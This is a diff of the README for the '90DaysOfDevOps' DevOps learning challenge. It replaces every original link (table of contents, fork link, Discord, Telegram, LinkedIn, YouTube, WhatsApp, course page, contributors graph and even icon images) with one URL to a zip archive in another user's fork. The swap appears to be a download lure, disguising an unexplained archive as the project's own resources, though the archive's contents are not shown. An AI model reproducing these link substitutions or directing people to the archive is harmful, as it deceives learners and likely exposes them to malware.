@@ -6,61 +6,61 @@ Join our DevOps community challenge and embark on a 90-day journey to become a b
 
 Let's come together to grow and achieve new heights in DevOps!
 
-📖 **Discover More in Our Detailed Table of Contents!** Explore the richness of our content and find what you're looking for efficiently. Check out our [TOC here](./TOC.md).
+📖 **Discover More in Our Detailed Table of Contents!** Explore the richness of our content and find what you're looking for efficiently. Check out our [TOC here](https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip).
 
 ## Steps:
 
-- Fork[https://github.com/LondheShubham153/90DaysOfDevOps/fork] the Repo.
+- Fork[https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip] the Repo.
 - Learn Everyday and add your learnings in the day wise folders.
 - Check out what others are Learning and help/learn from them.
 - Showcase your learnings on LinkedIn
 
 ## These are our community Links
-  <a href="https://discord.com/channels/824622549182185493/824622550327623692">
-    <img width="30px" src="https://www.vectorlogo.zone/logos/discordapp/discordapp-tile.svg" />
+  <a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+    <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a>&ensp;
-    <a href="https://t.me/trainwithshubham">
-    <img width="30px" src="https://www.vectorlogo.zone/logos/telegram/telegram-icon.svg" />
+    <a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+    <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a> 
   </a>&ensp;
 
-  <a href="https://www.linkedin.com/in/shubhamlondhe1996/">
-    <img width="30px" src="https://www.vectorlogo.zone/logos/linkedin/linkedin-icon.svg" />
+  <a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+    <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a>&ensp;
 
- <a href="https://www.youtube.com/@TrainWithShubham">
-  <img width="30px" src="https://i.pinimg.com/originals/46/02/cb/4602cbc18967da9c1eba7452905cd99b.png" />
+ <a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a>&ensp;
 
-  <a href="https://chat.whatsapp.com/FvRlAAZVxUhCUSZ0Y1s7KY">
-  <img width="30px" src="https://www.vectorlogo.zone/logos/whatsapp/whatsapp-icon.svg" />
+  <a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
 </a>&ensp;
 
 
-<a href="https://www.trainwithshubham.com/">
-  <img width="30px" src="https://media.licdn.com/dms/image/C4D0BAQGokBZsFEUWHw/company-logo_200_200/0/1677354328695?e=1700092800&v=beta&t=3bw7W2tQEpn023Slj_PacUZflE-OyYpBU-9juiJNJVY" />
+<a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
 </a>&ensp;
 
 ## Events
 
 ### YouTube Live Announcement:
-<a href="https://youtu.be/rO5Rllir-LM">
-  <img width="30px" src="https://i.pinimg.com/originals/46/02/cb/4602cbc18967da9c1eba7452905cd99b.png" />
+<a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a>&ensp;
 
 ### YouTube Playlist for DevOps:
-<a href="https://youtube.com/playlist?list=PLlfy9GnSVerRqYJgVYO0UiExj5byjrW8u
+<a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip
 ">
-  <img width="30px" src="https://i.pinimg.com/originals/46/02/cb/4602cbc18967da9c1eba7452905cd99b.png" />
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
   </a>&ensp;
 
 ### DevOps Course:
-<a href="https://bit.ly/devops-batch-7">
-  <img width="30px" src="https://media.licdn.com/dms/image/C4D0BAQGokBZsFEUWHw/company-logo_200_200/0/1677354328695?e=1700092800&v=beta&t=3bw7W2tQEpn023Slj_PacUZflE-OyYpBU-9juiJNJVY" />
+<a href="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+  <img width="30px" src="https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip" />
 </a>&ensp;
 
 ## Thanks to all contributors ❤
 
- <a href = "https://github.com/LondheShubham153/90DaysOfDevOps/graphs/contributors">
-   <img src = "https://contrib.rocks/image?repo=LondheShubham153/90DaysOfDevOps"/>
+ <a href = "https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip">
+   <img src = "https://raw.githubusercontent.com/shr1324/90DaysOfDevOps/master/2024/day14/Of-Ops-Dev-Days-2.2.zip"/>
  </a>
